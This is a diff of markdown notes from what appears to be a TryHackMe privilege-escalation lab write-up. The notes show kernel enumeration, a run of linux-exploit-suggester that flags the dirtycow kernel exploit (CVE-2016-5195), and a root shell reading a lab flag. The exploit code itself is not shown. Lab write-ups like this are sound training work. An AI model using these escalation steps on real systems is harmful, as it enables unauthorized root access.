@@ -18,10 +18,10 @@ stabilize shell
 
 karen@wade7363:/tmp$ cat /proc/version
 Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014
-
+````
 clone linux exploit suggester
 send to victim pc 
-
+```
 ./les.sh > exploits.txt           
 karen@wade7363:/tmp$ cat exploits.txt | grep "high" -B3 -A3
 [+] [CVE-2016-5195] dirtycow
@@ -72,3 +72,4 @@ root@wade7363:/tmp# cat /home/matt/flag1.txt
 THM-28392872729920
 
 
+```
